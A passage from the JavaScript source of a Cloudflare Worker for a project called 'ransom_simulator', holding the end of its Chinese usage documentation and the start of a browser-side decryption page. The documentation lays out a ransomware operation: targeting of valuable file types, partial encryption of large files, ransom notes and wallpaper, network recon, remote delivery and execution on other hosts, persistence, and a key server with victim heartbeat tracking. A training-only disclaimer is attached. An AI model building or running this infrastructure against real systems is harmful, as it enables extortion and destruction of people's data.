                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">operations.log</td><td class="px-3 py-2 border-b border-r"><code class="text-[12px]">-log</code></td><td class="px-3 py-2 border-b">完整操作过程、原始壁纸路径、任务清理、守护进程等</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">ransom_log.txt</td><td class="px-3 py-2 border-b border-r">加密阶段</td><td class="px-3 py-2 border-b">加密 worker 的运行日志（程序目录）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">recon_report_&lt;ts&gt;.json / .csv</td><td class="px-3 py-2 border-b border-r"><code class="text-[12px]">--scan</code> / <code class="text-[12px]">--scan-only</code></td><td class="px-3 py-2 border-b">端口、服务指纹、风险等级、本机资产</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">remote_report_&lt;ts&gt;.json</td><td class="px-3 py-2 border-b border-r"><code class="text-[12px]">--remote-*</code></td><td class="px-3 py-2 border-b">逐主机连通/认证/投递/执行/回收结果</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">scheduler.log</td><td class="px-3 py-2 border-b border-r">定时任务</td><td class="px-3 py-2 border-b">后台子进程输出（等待进度、执行过程）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">key_cache_&lt;uuid&gt;.json</td><td class="px-3 py-2 border-b border-r"><code class="text-[12px]">--keep-key</code></td><td class="px-3 py-2 border-b">UUID、公钥 PEM、创建时间、模式、版本</td></tr>
                            </tbody>
                        </table>
                    </div>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">13.2 增强文件识别</h3>
                    <p class="text-sm leading-7 text-gray-600 mb-2">未指定 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-ext</code> 时使用内置扩展名列表，覆盖企业环境中价值较高的文件类型：</p>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600"><tr><th class="text-left px-3 py-2 border-b border-r">类别</th><th class="text-left px-3 py-2 border-b">典型扩展名</th></tr></thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r">文档 / 表格 / 演示</td><td class="px-3 py-2 border-b font-mono text-[12px]">.doc .docx .xls .xlsx .ppt .pptx .pdf .txt .rtf .odt</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">数据库与导出</td><td class="px-3 py-2 border-b font-mono text-[12px]">.sql .db .mdb .sqlite .dbf .bak .dump</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">配置与密钥</td><td class="px-3 py-2 border-b font-mono text-[12px]">.conf .cfg .ini .env .yaml .yml .key .pem .crt .cer .pfx .p12</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">备份与压缩</td><td class="px-3 py-2 border-b font-mono text-[12px]">.zip .rar .7z .tar .gz .tgz .bz2 .xz</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">网页与代码</td><td class="px-3 py-2 border-b font-mono text-[12px]">.html .htm .js .css .php .jsp .asp .twig .tpl .vue .jsx .ts</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">日志与数据</td><td class="px-3 py-2 border-b font-mono text-[12px]">.log .csv .json .xml .dat</td></tr>
                            </tbody>
                        </table>
                    </div>
                    <p class="text-sm leading-7 text-gray-600">指定 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-dir</code> 时默认处理目录下所有格式（忽略内置列表）；可用 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-ext</code> 收窄范围。</p>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">13.3 程序自身产物保护</h3>
                    <p class="text-sm leading-7 text-gray-600 mb-2">以下文件在扫描阶段自动跳过，<code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-dir</code> 全格式加密与 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-remove</code> 都不会处理它们：</p>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>public_key*.pem          # 公钥
key_cache_*.json         # --keep-key 密钥缓存
ransom_note* / !!!_如何解密你的文件_!!!.txt
ransom_wallpaper.png     # 勒索壁纸
ransom_log.txt
success_encrypted.log / failed_encrypted.log / operations.log
recon_report_* / remote_report_*
.lock / *.encrypted / .schedule_done_*</code></pre>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">13.4 大文件部分加密</h3>
                    <p class="text-sm leading-7 text-gray-600">单个文件超过 1GB 时，程序只加密头部 1 块、尾部 1 块与中间若干随机块（默认 5 块），文件其余部分保持不变，用于在演练中快速产生“不可用感”而不耗时搬运整盘数据。解密工具与浏览器解密均支持这种 PENC 格式。</p>
                </section>

                <section id="platformapi" class="mb-12">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">14. 平台服务与 API（Worker）</h2>
                    <p class="text-sm leading-7 text-gray-600 mb-3">密钥下发、终端心跳与管理后台由 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">workers/_worker.js</code> 提供，部署在 Cloudflare Workers 并绑定 D1 数据库。</p>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">14.1 服务路由</h3>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600"><tr><th class="text-left px-3 py-2 border-b border-r">路径</th><th class="text-left px-3 py-2 border-b border-r">方法</th><th class="text-left px-3 py-2 border-b">说明</th></tr></thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">/</td><td class="px-3 py-2 border-b border-r">GET</td><td class="px-3 py-2 border-b">首页：密钥生成、UUID 查询、统计趋势、下载入口</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">/docs</td><td class="px-3 py-2 border-b border-r">GET</td><td class="px-3 py-2 border-b">本使用说明页面</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">/decrypt</td><td class="px-3 py-2 border-b border-r">GET</td><td class="px-3 py-2 border-b">浏览器端本地解密页面</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">/{SECRET_PATH}</td><td class="px-3 py-2 border-b border-r">POST</td><td class="px-3 py-2 border-b">客户端自动化密钥生成（默认 /E56dSY，可后台修改）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">/api/generate</td><td class="px-3 py-2 border-b border-r">POST</td><td class="px-3 py-2 border-b">网页手动生成密钥（Turnstile 人机验证）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">/query</td><td class="px-3 py-2 border-b border-r">GET</td><td class="px-3 py-2 border-b">按 UUID 查询公私钥</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">/stats</td><td class="px-3 py-2 border-b border-r">GET</td><td class="px-3 py-2 border-b">密钥生成总量与趋势</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">/api/heartbeat</td><td class="px-3 py-2 border-b border-r">POST</td><td class="px-3 py-2 border-b">终端心跳（每 30 秒），写入 terminals 表</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">/admin</td><td class="px-3 py-2 border-b border-r">GET</td><td class="px-3 py-2 border-b">终端在线管理后台（登录后访问）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">/admin/settings</td><td class="px-3 py-2 border-b border-r">GET/POST</td><td class="px-3 py-2 border-b">系统设置：登录密钥、密钥路径、心跳密钥、Turnstile</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">/admin/api/terminals</td><td class="px-3 py-2 border-b border-r">GET</td><td class="px-3 py-2 border-b">终端列表 JSON（Cookie 或 Bearer 鉴权）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">/beacon_check_in</td><td class="px-3 py-2 border-b border-r">GET/POST</td><td class="px-3 py-2 border-b">旧版 Beacon 兼容端点（仅记日志）</td></tr>
                            </tbody>
                        </table>
                    </div>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">14.2 D1 数据表</h3>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600"><tr><th class="text-left px-3 py-2 border-b border-r">表</th><th class="text-left px-3 py-2 border-b">用途</th></tr></thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">keys</td><td class="px-3 py-2 border-b">密钥对历史（uuid, public_key, private_key, rid, created_at）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">key_metrics</td><td class="px-3 py-2 border-b">累计生成量、最新 UUID 与时间（清理 keys 不影响统计）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">terminals</td><td class="px-3 py-2 border-b">终端在线状态（主机、用户、系统、版本、IP、最后心跳）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">settings</td><td class="px-3 py-2 border-b">后台可维护变量（登录密钥哈希、密钥路径、心跳密钥、Turnstile）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">admin_sessions</td><td class="px-3 py-2 border-b">管理后台会话（仅存令牌 SHA-256 摘要）</td></tr>
                            </tbody>
                        </table>
                    </div>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">14.3 环境变量与系统设置</h3>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600"><tr><th class="text-left px-3 py-2 border-b border-r">变量</th><th class="text-left px-3 py-2 border-b">说明</th></tr></thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">SECRET_PATH</td><td class="px-3 py-2 border-b">密钥接口安全路径，默认 E56dSY；后台设置优先</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">TURNSTILE_SITE_KEY / TURNSTILE_SECRET_KEY</td><td class="px-3 py-2 border-b">网页生成密钥的人机验证；未配置则不校验</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">ADMIN_TOKEN</td><td class="px-3 py-2 border-b">管理后台初始/回退登录密钥；后台设置自定义密钥后以其为准</td></tr>
                            </tbody>
                        </table>
                    </div>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">14.4 密钥与隐私说明</h3>
                    <ul class="list-disc pl-5 space-y-1 text-sm leading-7 text-gray-600">
                        <li>每次调用密钥生成接口都会创建全新的 RSA-2048 密钥对；私钥仅保存在服务端（或你自行保存的离线私钥文件）。</li>
                        <li>系统会定期清理 keys 表，但累计统计保存在 key_metrics，不受影响；请及时下载并妥善保存私钥。</li>
                        <li>浏览器解密全部在本地完成，私钥与文件内容不会上传。</li>
                        <li>管理后台的登录密钥以 PBKDF2-SHA256 哈希存储；修改后所有会话立即失效。</li>
                    </ul>
                </section>

                <section id="faq" class="mb-12">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">15. 常见问题</h2>
                    <div class="space-y-4">
                        <div>
                            <p class="font-semibold text-gray-800">双击后窗口一闪而过？</p>
                            <p class="text-sm leading-7 text-gray-600">旧版在无密钥时会直接退出。当前版本会打印中文提示并停留 15 秒；请按提示把公钥放到程序目录，或连接网络后重试。</p>
                        </div>
                        <div>
                            <p class="font-semibold text-gray-800">断网时提示获取密钥失败？</p>
                            <p class="text-sm leading-7 text-gray-600">确认程序目录存在 public_key_*.pem；联网成功运行过一次后也会自动缓存公钥。</p>
                        </div>
                        <div>
                            <p class="font-semibold text-gray-800">管理后台出现 500 / 1101？</p>
                            <p class="text-sm leading-7 text-gray-600">确认已部署最新 workers/_worker.js；如仍失败，在 Cloudflare 控制台按 Ray ID 查看 Workers Logs 中的异常堆栈。</p>
                        </div>
                        <div>
                            <p class="font-semibold text-gray-800">后台看不到终端在线？</p>
                            <p class="text-sm leading-7 text-gray-600">客户端需为支持心跳的新版本；若后台启用了心跳接收密钥，客户端需带 --heartbeat-token。离线判定为 90 秒。</p>
                        </div>
                        <div>
                            <p class="font-semibold text-gray-800">定时任务重启后没有执行？</p>
                            <p class="text-sm leading-7 text-gray-600">查看程序目录的 scheduler.log；Windows 无管理员权限时自启依赖用户登录，Linux 需要 cron 服务。也可改用 --persist-schedule。</p>
                        </div>
                        <div>
                            <p class="font-semibold text-gray-800">ARM 文件下载 404？</p>
                            <p class="text-sm leading-7 text-gray-600">对应架构文件尚未上传到存储桶，请先上传后再下载。</p>
                        </div>
                    </div>
                </section>

                <section id="legal" class="mb-6">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">16. 合规与免责声明</h2>
                    <p class="text-sm leading-7 text-gray-600">本工具仅用于安全研究和培训。使用者必须确保已获得系统所有者的明确授权，并在隔离环境中运行；开发者不对任何滥用行为及由此造成的数据丢失承担责任。真实勒索软件是严重犯罪行为，本项目仅用于教育与防御研究。</p>
                </section>
            </main>
        </div>

        <div class="mt-12 pt-6 border-t border-gray-200 text-center text-gray-500 text-sm">
            <p>Powered by <a href="https://www.yangzihome.space" class="text-gray-600 hover:text-gray-800">YZFN</a> | <a href="/" class="text-gray-600 hover:text-gray-800">ransom_simulator</a> | <a href="/docs" class="text-gray-600 hover:text-gray-800">使用说明</a></p>
        </div>
    </div>
    <script>lucide.createIcons();</script>
</body>
</html>`;
}

// ===================================================================================
// 第三部分：浏览器端解密页面
// ===================================================================================

function getDecryptPage() {
    const DECRYPT_SCRIPT = `
// --- 常量定义 (与 decryptor.go 保持一致) ---
const ENCRYPTED_KEY_LENGTH = 256; // RSA-2048 密文长度 = 256 字节
const NONCE_SIZE = 12; // AES-GCM nonce 大小
const PENC_MAGIC = "PENC";
const ENCRYPTED_SUFFIX = ".encrypted";

// --- 工具函数 ---
function log(msg) {
    const el = document.getElementById('logArea');
    if (el) {
        el.textContent += '[' + new Date().toLocaleTimeString() + '] ' + msg + '\\n';
        el.scrollTop = el.scrollHeight;
    }
}

function setStatus(msg, type) {
    const el = document.getElementById('status');
    if (!el) return;
    el.textContent = msg;
    el.className = '';
    if (type === 'error') el.className = 'text-red-600';
    else if (type === 'success') el.className = 'text-green-600';
    else if (type === 'warning') el.className = 'text-yellow-600';
    else el.className = 'text-gray-600';
}

// --- 从 PEM 字符串导入 RSA 私钥 ---
async function importPrivateKeyFromPEM(pemStr) {
    // 移除 PEM 头和尾，解码 Base64
    const pemHeader = '-----BEGIN PRIVATE KEY-----';
    const pemFooter = '-----END PRIVATE KEY-----';
    let b64 = pemStr;
    if (b64.includes(pemHeader)) {
        b64 = b64.replace(pemHeader, '').replace(pemFooter, '');
    }
    // 也支持 RSA PRIVATE KEY (PKCS#1)
    const rsaHeader = '-----BEGIN RSA PRIVATE KEY-----';
    const rsaFooter = '-----END RSA PRIVATE KEY-----';
    if (b64.includes(rsaHeader)) {
        b64 = b64.replace(rsaHeader, '').replace(rsaFooter, '');
    }
    b64 = b64.replace(/\\s/g, '');
    const binaryDer = Uint8Array.from(atob(b64), c => c.charCodeAt(0));

    let format = 'pkcs8';
    if (pemStr.includes('RSA PRIVATE KEY')) {
        format = 'pkcs8'; // Web Crypto 统一用 pkcs8 导入
    }

    try {
        return await crypto.subtle.importKey(
            format,
            binaryDer.buffer,
            { name: 'RSA-OAEP', hash: 'SHA-256' },
            false,
            ['decrypt']
        );
    } catch (e) {
        // 如果 pkcs8 失败，尝试用 JWK 方式（兼容性更好）
        log('PKCS8 导入失败，尝试备用方案: ' + e.message);
        throw e;
    }
}

// --- 完整加密文件解密 (小文件) ---
// 格式: [256 bytes RSA-encrypted AES key][12 bytes nonce][AES-GCM ciphertext]
async function decryptFullFile(encryptedData, privateKey) {
    if (encryptedData.byteLength < ENCRYPTED_KEY_LENGTH + NONCE_SIZE) {
        throw new Error('文件大小无效，不符合完整加密格式');
    }

    const encryptedAESKey = encryptedData.slice(0, ENCRYPTED_KEY_LENGTH);
    const nonce = encryptedData.slice(ENCRYPTED_KEY_LENGTH, ENCRYPTED_KEY_LENGTH + NONCE_SIZE);
    const ciphertext = encryptedData.slice(ENCRYPTED_KEY_LENGTH + NONCE_SIZE);

    // RSA-OAEP 解密 AES 密钥
    const aesKeyBuffer = await crypto.subtle.decrypt(
        { name: 'RSA-OAEP' },
        privateKey,
        encryptedAESKey
    );

    // 导入 AES 密钥用于 AES-GCM 解密
    const aesKey = await crypto.subtle.importKey(
        'raw',
        aesKeyBuffer,
        { name: 'AES-GCM', length: aesKeyBuffer.byteLength * 8 },
        false,
        ['decrypt']
    );

    // AES-GCM 解密
    const plaintext = await crypto.subtle.decrypt(
        { name: 'AES-GCM', iv: nonce },
        aesKey,
        ciphertext
    );

    return new Uint8Array(plaintext);
}

// --- 部分加密文件解密 (PENC 格式, 大文件) ---
// 格式: [4 bytes "PENC"][4 bytes chunks JSON 长度 LE][chunks JSON][4 bytes key长度 LE][加密AES密钥][所有加密块数据]
async function decryptPartialFile(encryptedData, privateKey) {
    const view = new DataView(encryptedData.buffer, encryptedData.byteOffset, encryptedData.byteLength);

    // 解析 chunks JSON 长度
    const chunksLen = view.getUint32(4, true); // LittleEndian
    const jsonStart = 8;
    const jsonEnd = 8 + chunksLen;
    if (jsonEnd > encryptedData.byteLength) {
        throw new Error('PENC 格式损坏: chunks 元数据超出文件大小');
    }

    // 解析 chunks JSON
    const decoder = new TextDecoder();
    const chunksJSON = decoder.decode(encryptedData.slice(jsonStart, jsonEnd));
    const chunks = JSON.parse(chunksJSON);
    log('  检测到 PENC 部分加密格式, ' + chunks.length + ' 个加密块');

    // 解析加密 AES 密钥长度
    const keyOffset = jsonEnd;
    if (keyOffset + 4 > encryptedData.byteLength) {
        throw new Error('PENC 格式损坏: 缺少密钥元数据');
    }
    const keyLen = view.getUint32(keyOffset, true);
    const keyStart = keyOffset + 4;
    const keyEnd = keyStart + keyLen;
    if (keyEnd > encryptedData.byteLength) {
        throw new Error('PENC 格式损坏: 加密密钥超出文件大小');
    }

    // RSA-OAEP 解密 AES 密钥
    const encryptedAESKey = encryptedData.slice(keyStart, keyEnd);
    const aesKeyBuffer = await crypto.subtle.decrypt(
        { name: 'RSA-OAEP' },
        privateKey,
        encryptedAESKey
    );

    const aesKey = await crypto.subtle.importKey(
        'raw',
        aesKeyBuffer,
        { name: 'AES-GCM', length: aesKeyBuffer.byteLength * 8 },
        false,
        ['decrypt']
    );

    // 所有加密块数据起始位置
    let chunkDataOffset = keyEnd;

    // 逐个解密数据块
    const decryptedChunks = [];
    for (let i = 0; i < chunks.length; i++) {
        const chunk = chunks[i];
        if (chunkDataOffset + chunk.data.length > encryptedData.byteLength) {
            throw new Error('PENC 格式损坏: 块 ' + i + ' 数据超出文件大小');
        }

        const chunkCiphertext = encryptedData.slice(chunkDataOffset, chunkDataOffset + chunk.data.length);
        const nonce = new Uint8Array(chunk.nonce);

        const plaintext = await crypto.subtle.decrypt(
            { name: 'AES-GCM', iv: nonce },
            aesKey,
            chunkCiphertext
        );

        decryptedChunks.push({
            offset: chunk.offset,
            data: new Uint8Array(plaintext)
        });

        chunkDataOffset += chunk.data.length;
        log('  解密块 ' + (i + 1) + '/' + chunks.length + ' (偏移=' + chunk.offset + ', 大小=' + chunk.size + ')');
    }

    return decryptedChunks;
}

// --- 处理单个文件 ---
async function processFile(file, privateKey) {
    const buffer = await file.arrayBuffer();
    const data = new Uint8Array(buffer);

    // 检测文件格式
    if (data.length >= 4 && new TextDecoder().decode(data.slice(0, 4)) === PENC_MAGIC) {
        log('  [PENC] ' + file.name);
        return await decryptPartialFile(data, privateKey);
    } else {
        log('  [完整加密] ' + file.name);
        return await decryptFullFile(data, privateKey);
    }
}

// --- 下载解密后的文件 ---
function downloadFile(fileName, data) {
    const origName = fileName.endsWith(ENCRYPTED_SUFFIX)
        ? fileName.slice(0, -ENCRYPTED_SUFFIX.length)
        : fileName + '.decrypted';
    const blob = new Blob([data], { type: 'application/octet-stream' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = origName;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    log('  -> 已下载: ' + origName);
}

// --- 主流程 ---
let selectedFiles = [];

document.addEventListener('DOMContentLoaded', () => {
    lucide.createIcons();

    const uuidInput = document.getElementById('uuidInput');
    const fetchKeyBtn = document.getElementById('fetchKeyBtn');
    const fileInput = document.getElementById('fileInput');
    const folderInput = document.getElementById('folderInput');
    const decryptBtn = document.getElementById('decryptBtn');
    const fileList = document.getElementById('fileList');

    if (uuidInput) uuidInput.focus();

    // 获取私钥
    fetchKeyBtn.addEventListener('click', async () => {
        const uuid = uuidInput.value.trim();
        if (!uuid) {
            setStatus('请输入 UUID', 'warning');
            return;
        }
        setStatus('正在查询私钥...', '');
        fetchKeyBtn.disabled = true;
        try {
            const resp = await fetch('/query?uuid=' + encodeURIComponent(uuid));
            const data = await resp.json();
            if (data.status !== 'success' || !data.private_key) {
                setStatus('未找到对应私钥: ' + (data.message || '未知错误'), 'error');
                fetchKeyBtn.disabled = false;
                return;
            }
            window._privateKeyPEM = data.private_key;
            setStatus('私钥已获取 (' + uuid.substring(0,8) + '...)', 'success');
            log('私钥已成功获取');
            // 启用文件选择和批量解密按钮
            fileInput.disabled = false;
            folderInput.disabled = false;
            document.getElementById('selectFilesBtn').disabled = false;
            document.getElementById('selectFolderBtn').disabled = false;
        } catch (e) {
            setStatus('网络错误: ' + e.message, 'error');
        } finally {
            fetchKeyBtn.disabled = false;
        }
    });

    // 选择文件
    document.getElementById('selectFilesBtn').addEventListener('click', () => {
        fileInput.click();
    });

    fileInput.addEventListener('change', (e) => {
        selectedFiles = Array.from(e.target.files).filter(f => f.name.endsWith(ENCRYPTED_SUFFIX));
        updateFileList();
    });

    // 选择文件夹
    document.getElementById('selectFolderBtn').addEventListener('click', () => {
        folderInput.click();
    });

    folderInput.addEventListener('change', (e) => {
        selectedFiles = Array.from(e.target.files).filter(f => f.name.endsWith(ENCRYPTED_SUFFIX));
        updateFileList();
    });

    function updateFileList() {
        if (selectedFiles.length === 0) {
            fileList.innerHTML = '<p class="text-gray-500 text-sm">未选择加密文件</p>';
            decryptBtn.disabled = true;
        } else {
            fileList.innerHTML = selectedFiles.map((f, i) =>
                '<div class="flex items-center text-sm text-gray-700 py-1">' +
                '<i data-lucide="file" class="w-4 h-4 mr-2 text-gray-500"></i>' +
                '<span class="truncate">' + escapeHtml(f.name) + '</span>' +
                '<span class="ml-auto text-gray-400 text-xs">' + formatSize(f.size) + '</span>' +
                '</div>'
            ).join('');
            lucide.createIcons();
            decryptBtn.disabled = false;
        }
    }

    // 批量解密
    decryptBtn.addEventListener('click', async () => {
        if (!window._privateKeyPEM) {
            setStatus('请先获取私钥', 'warning');
            return;
        }
        if (selectedFiles.length === 0) {
            setStatus('请先选择加密文件', 'warning');
            return;
        }

        decryptBtn.disabled = true;
        setStatus('正在解密...', '');
        log('=== 开始解密, 共 ' + selectedFiles.length + ' 个文件 ===');

        try {
            const privateKey = await importPrivateKeyFromPEM(window._privateKeyPEM);
            log('私钥导入成功');

            let successCount = 0;
            let failCount = 0;

            for (let i = 0; i < selectedFiles.length; i++) {
                const file = selectedFiles[i];
                try {
                    log('(' + (i+1) + '/' + selectedFiles.length + ') 处理: ' + file.name);
                    const result = await processFile(file, privateKey);

                    if (result instanceof Uint8Array) {
                        // 完整加密: 直接下载
                        downloadFile(file.name, result);
                    } else if (Array.isArray(result)) {
                        // 部分加密: 需要重建原始文件
                        // 先读取原始文件 (去掉 .encrypted)，但浏览器端无法直接读取
                        // 这里我们生成一个仅包含解密块的 JSON 描述文件，或尝试询问用户提供原始文件
                        log('  [警告] PENC 格式需要原始文件才能完成解密，浏览器端仅支持将解密块另存为 JSON');
                        const meta = {
                            format: 'PENC_partial_decrypted',
                            originalFile: file.name.replace(/.encrypted$/, ''),
                            chunks: result.map(c => ({
                                offset: c.offset,
                                size: c.data.length,
                                data_b64: btoa(String.fromCharCode(...c.data))
                            }))
                        };
                        const jsonBlob = new Blob([JSON.stringify(meta, null, 2)], { type: 'application/json' });
                        const url = URL.createObjectURL(jsonBlob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = file.name.replace(/.encrypted$/, '') + '.decrypted_chunks.json';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                        URL.revokeObjectURL(url);
                        log('  -> 已导出解密块描述文件');
                    }
                    successCount++;
                } catch (e) {
                    log('  [错误] ' + file.name + ': ' + e.message);
                    failCount++;
                }
            }

            log('=== 解密完成: 成功 ' + successCount + ' 个, 失败 ' + failCount + ' 个 ===');
            setStatus('解密完成: 成功 ' + successCount + ', 失败 ' + failCount, successCount > 0 ? 'success' : 'error');
        } catch (e) {
            log('私钥导入失败: ' + e.message);
            setStatus('私钥导入失败: ' + e.message, 'error');
        } finally {
            decryptBtn.disabled = false;
        }
    });

    // 清空日志
    document.getElementById('clearLogBtn').addEventListener('click', () => {
        document.getElementById('logArea').textContent = '';
    });
});

function escapeHtml(text) {
    if (!text) return '';
    return String(text).replace(/[&<>"']/g, function(m) {
        return {'&':'&','<':'<','>':'>','"':'"',"'":'&#039;'}[m];
    });
}

function formatSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    const units = ['KB', 'MB', 'GB', 'TB'];
    let i = -1;
    let size = bytes;
    do { size /= 1024; i++; } while (size >= 1024 && i < units.length - 1);
    return size.toFixed(1) + ' ' + units[i];
}
    `;

    return `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>浏览器端解密 - 勒索模拟器</title>
    <link rel="icon" href="https://s3.yangzifun.org/logo.ico" type="image/x-icon">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: {
              gray: {
                50: '#f8f9fa', 100: '#f1f3f4', 200: '#e8ebed', 300: '#d1d5db',
                400: '#9ca3af', 500: '#89949B', 600: '#5a666d', 700: '#3d474d',
              }
            },
            fontFamily: {
              'sans': ['-apple-system', 'BlinkMacSystemFont', '"Segoe UI"', 'Roboto', 'sans-serif'],
              'mono': ['SF Mono', 'Courier New', 'monospace']
            }
          }
        }
      }
    </script>
    <style>
      @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
      html { font-size: 87.5%; }
      body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
      #logArea { font-family: 'SF Mono', 'Courier New', monospace; white-space: pre-wrap; word-break: break-all; }
    </style>
</head>
<body class="bg-white min-h-screen text-gray-700">
    <div class="min-h-screen flex flex-col items-center py-10 px-4 sm:px-6 lg:px-8">
        <div class="w-full max-w-4xl mx-auto">
            <!-- 页头 -->
            <div class="mb-10 text-center">
                <div class="flex items-center justify-center mb-4">
                    <i data-lucide="unlock" class="w-10 h-10 mr-4 text-gray-600"></i>
                    <h1 class="text-3xl sm:text-4xl font-bold text-gray-700">浏览器端文件解密</h1>
                </div>
                <p class="text-gray-500 text-lg mb-2">输入 UUID 获取私钥，选择本地加密文件即可在浏览器中完成解密</p>
                <p class="text-gray-400 text-sm">所有解密操作均在本地浏览器中完成，私钥和文件不会上传到服务器</p>
            </div>

            <!-- 安全提示 -->
            <div class="bg-blue-50 border border-blue-400 rounded-xl p-5 mb-8">
                <div class="flex items-start">
                    <i data-lucide="info" class="w-6 h-6 mr-3 text-blue-600 flex-shrink-0 mt-0.5"></i>
                    <div class="text-blue-700 text-sm">
                        <strong>隐私说明：</strong>所有解密操作均在您的浏览器本地完成。私钥仅在内存中保存，文件内容不会上传到任何服务器。支持 <strong>.encrypted</strong> 后缀的完整加密和部分加密 (PENC) 格式文件。
                    </div>
                </div>
            </div>

            <!-- 步骤 1: 输入 UUID -->
            <div class="bg-gray-50 border border-gray-200 rounded-xl p-6 mb-6">
                <div class="flex items-center mb-4">
                    <span class="w-8 h-8 rounded-full bg-gray-700 text-white flex items-center justify-center text-sm font-bold mr-3">1</span>
                    <h2 class="text-xl font-semibold text-gray-700">输入 UUID 获取私钥</h2>
                </div>
                <div class="flex flex-col sm:flex-row gap-3">
                    <input type="text" id="uuidInput" placeholder="例如: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
                        class="flex-1 px-4 py-3 border-2 border-gray-400 rounded font-mono text-sm focus:outline-none focus:border-gray-600">
                    <button id="fetchKeyBtn" class="flex items-center justify-center px-6 py-3 bg-gray-700 text-white border-2 border-gray-700 rounded font-medium hover:bg-gray-800 transition-colors whitespace-nowrap">
                        <i data-lucide="key" class="w-5 h-5 mr-2"></i> 获取私钥
                    </button>
                </div>
                <div id="status" class="mt-3 text-sm font-medium min-h-[1.5em]"></div>
            </div>

            <!-- 步骤 2: 选择文件 -->
            <div class="bg-gray-50 border border-gray-200 rounded-xl p-6 mb-6">
                <div class="flex items-center mb-4">
                    <span class="w-8 h-8 rounded-full bg-gray-700 text-white flex items-center justify-center text-sm font-bold mr-3">2</span>
                    <h2 class="text-xl font-semibold text-gray-700">选择加密文件</h2>
                </div>
                <p class="text-sm text-gray-500 mb-4">选择需要解密的 .encrypted 文件。支持多选，可以选择单个文件或整个文件夹。</p>
                <div class="flex flex-wrap gap-3 mb-4">
